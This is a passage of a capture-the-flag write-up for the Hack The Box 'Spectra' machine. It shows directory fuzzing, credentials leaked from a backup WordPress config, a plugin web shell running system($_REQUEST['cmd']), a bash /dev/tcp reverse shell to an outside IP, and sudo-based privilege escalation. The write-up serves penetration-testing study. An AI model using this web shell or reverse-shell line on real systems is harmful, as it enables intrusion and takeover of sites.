<pre><code>$ ffuf -u &lt;http://spectra.htb/testing/FUZZ&gt; -w /usr/share/wordlists/dirb/common.txt -r -v -c -ic -e .php,.txt -of html -o http/http-80-common-testing.html

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : &lt;http://spectra.htb/testing/FUZZ&gt;
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt
 :: Output file      : http/http-80-common-testing.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 2514, Words: 1130, Lines: 27]
| URL | &lt;http://spectra.htb/testing/&gt;
    * FUZZ:

[Status: 200, Size: 19915, Words: 3331, Lines: 385]
| URL | &lt;http://spectra.htb/testing/license.txt&gt;
    * FUZZ: license.txt

[Status: 200, Size: 11460, Words: 5252, Lines: 102]
| URL | &lt;http://spectra.htb/testing/wp-admin&gt;
    * FUZZ: wp-admin

[Status: 200, Size: 627, Words: 259, Lines: 11]
| URL | &lt;http://spectra.htb/testing/wp-content&gt;
    * FUZZ: wp-content

[Status: 200, Size: 585, Words: 50, Lines: 7]
| URL | &lt;http://spectra.htb/testing/wp-settings.php&gt;
    * FUZZ: wp-settings.php

[Status: 200, Size: 25891, Words: 10424, Lines: 215]
| URL | &lt;http://spectra.htb/testing/wp-includes&gt;
    * FUZZ: wp-includes

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
    * FUZZ: xmlrpc.php

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
    * FUZZ: xmlrpc.php

:: Progress: [13842/13842] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:45] :: Errors: 0 ::

</code></pre><ul>
<li>
<p>Going to <code>/testing/wp-admin</code> displays all the files in that directory. Perhaps, directory listing is turned on.</p>
<p><img src="/img/spectra/Pasted_image_20210617193018.png" alt="/img/spectra/Pasted_image_20210617193018.png"></p>
</li>
<li>
<p>Instead of going to <code>/testing/index.php</code> -&gt; <code>/testing/</code> gives us all the files there.</p>
<p><img src="/img/spectra/Pasted_image_20210617193216.png" alt="/img/spectra/Pasted_image_20210617193216.png"></p>
</li>
</ul>
<p>==Should try <em>.php.save</em> during directory brute forcing as well==</p>
<p>Seeing the source code of <code>wp-config.php.save</code> gives DB credentials</p>
<p><img src="/img/spectra/Pasted_image_20210617193453.png" alt="/img/spectra/Pasted_image_20210617193453.png"></p>
<pre><code>define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'devtest' );
/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

</code></pre><p>Using this credentials to login as <code>administrator</code> on <code>http://spectra.htb/main/wp-admin/login.php</code> and we are in.</p>
<p><img src="/img/spectra/Pasted_image_20210617193948.png" alt="/img/spectra/Pasted_image_20210617193948.png"></p>
<p>Going to theme editor and updating 404.php</p>
<p><img src="/img/spectra/Pasted_image_20210617194207.png" alt="/img/spectra/Pasted_image_20210617194207.png"></p>
<p>Error:</p>
<p><img src="/img/spectra/Pasted_image_20210617194410.png" alt="/img/spectra/Pasted_image_20210617194410.png"></p>
<h3 id="getting-shell-by-uploading-plugin">Getting shell by uploading plugin</h3>
<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ cat rev.php
&lt;?php

/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: fake_batman_
 */
    system($_REQUEST['cmd']);

?&gt;
┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ zip rev.zip rev.php
updating: rev.php (deflated 3%
</code></pre><p><img src="/img/spectra/Pasted_image_20210617203800.png" alt="/img/spectra/Pasted_image_20210617203800.png"></p>
<p>Upload the plugin.</p>
<p>Go to <code>view-source:&lt;http://spectra.htb/main/wp-content/plugins/rev/rev.php?cmd=id&gt;</code></p>
<p>And we get RCE</p>
<p><img src="/img/spectra/Pasted_image_20210617204606.png" alt="/img/spectra/Pasted_image_20210617204606.png"></p>
<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.28/4444 0&gt;&amp;1

</code></pre><h1 id="escalating-to-user">Escalating to user</h1>
<p><img src="/img/spectra/Pasted_image_20210617213606.png" alt="/img/spectra/Pasted_image_20210617213606.png"></p>
<p><img src="/img/spectra/Pasted_image_20210617213634.png" alt="/img/spectra/Pasted_image_20210617213634.png"></p>
<p><img src="/img/spectra/Pasted_image_20210617213655.png" alt="/img/spectra/Pasted_image_20210617213655.png"></p>
<p>The password <code>SummerHereWeCome!!</code> works for katie. Hehe!</p>
<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ ssh katie@spectra.htb
Password:
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt
e89d27fe195e911*****************
</code></pre><h2 id="escalating-to-the-root">Escalating to the root</h2>
<p>We are use <code>katie</code> and need to get root.</p>
<h3 id="sudo--l-output"><code>sudo -l</code> output</h3>
<pre><code>katie@spectra /dev/shm $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl

</code></pre><p>Getting to root -&gt; <a href="https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9">https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9</a></p>
<h3 id="linpeassh-interesting-screenshots">linpeas.sh interesting screenshots</h3>
<p><img src="/img/spectra/Pasted_image_20210618001207.png" alt="/img/spectra/Pasted_image_20210618001207.png"></p>
<p>katie is in group <code>developers</code></p>
<p><img src="/img/spectra/Pasted_image_20210618001309.png" alt="/img/spectra/Pasted_image_20210618001309.png"></p>
]]></content>
        </item>
        
    </channel>
</rss>
